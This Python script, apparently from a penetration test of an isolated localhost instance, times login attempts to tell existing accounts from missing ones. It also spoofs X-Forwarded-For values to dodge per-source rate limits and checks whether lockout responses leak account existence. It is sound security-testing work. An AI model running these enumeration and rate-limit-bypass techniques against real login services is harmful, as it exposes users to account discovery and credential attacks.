#!/usr/bin/env python3
"""17 账号枚举：响应时间与状态差异统计（隔离实例 bf-*，经文档配置前端 8603 与 XFF 透传 8604）。"""
import json
import os
import statistics
import time

import httpx

DOC = "https://localhost:8603"
XFF = "https://localhost:8604"
SITE = "https://localhost:8603"
EV = "/tmp/sj-attacker/evidence-bf"
os.makedirs(EV, exist_ok=True)
RES = {}


def note(k, v):
    RES[k] = v
    print(f"[{k}] {json.dumps(v, ensure_ascii=False)[:700]}")


def one(client, base, user, pw, xff=None):
    h = {"Origin": SITE}
    if xff:
        h["X-Forwarded-For"] = xff
    t0 = time.perf_counter()
    r = client.post(base + "/api/login/", data={"username": user, "password": pw},
                    headers=h, timeout=20)
    dt = (time.perf_counter() - t0) * 1000
    return r.status_code, dt, r.text[:120]


def stats(xs):
    xs = sorted(xs)
    return {"n": len(xs), "median": round(statistics.median(xs), 1),
            "mean": round(statistics.fmean(xs), 1),
            "p10": round(xs[int(len(xs) * 0.1)], 1),
            "p90": round(xs[int(len(xs) * 0.9) - 1], 1),
            "min": round(xs[0], 1), "max": round(xs[-1], 1)}


def main():
    existing, missing = [], []
    with httpx.Client(verify=False, http2=False) as c:
        c.get(DOC + "/api/health/")  # 预热连接
        # 现有账号：10 次上限内采样，用错误口令
        for i in range(10):
            st, dt, _ = one(c, DOC, "bf-victim", "Wrong-Password-2026")
            existing.append(dt)
            time.sleep(0.15)
        # 不存在账号：轮换 XFF 以获得新来源桶，避免 30 次/来源上限干扰
        for i in range(24):
            st, dt, _ = one(c, XFF, f"ghost-user-{i:03d}", "Wrong-Password-2026",
                            xff=f"198.51.100.{10 + i}")
            missing.append(dt)
            time.sleep(0.1)

    note("existing_account_timing_ms", stats(existing))
    note("missing_account_timing_ms", stats(missing))
    ratio = statistics.median(existing) / max(statistics.median(missing), 0.001)
    note("median_ratio_existing_vs_missing", round(ratio, 2))

    # 时间差是否稳定可分：用中位数阈值做判定
    thr = (statistics.median(existing) + statistics.median(missing)) / 2
    note("classifier_threshold_ms", round(thr, 1))
    note("misclassification", {
        "existing_slower_than_threshold": sum(1 for x in existing if x > thr),
        "existing_total": len(existing),
        "missing_slower_than_threshold": sum(1 for x in missing if x > thr),
        "missing_total": len(missing),
    })

    # 429/400 差异：锁定状态下的返回是否区分账号存在性
    with httpx.Client(verify=False) as c:
        st_exist, _, body_exist = one(c, DOC, "bf-victim", "Wrong-Password-2026")
        note("state_after_account_bucket", {"status": st_exist, "body": body_exist[:80]})
        st_missing, _, body_missing = one(c, DOC, "ghost-user-999", "Wrong-Password-2026")
        note("state_missing_account", {"status": st_missing, "body": body_missing[:80]})

    with open(EV + "/17-enum-timing.json", "w") as f:
        json.dump(RES, f, ensure_ascii=False, indent=2)


if __name__ == "__main__":
    main()
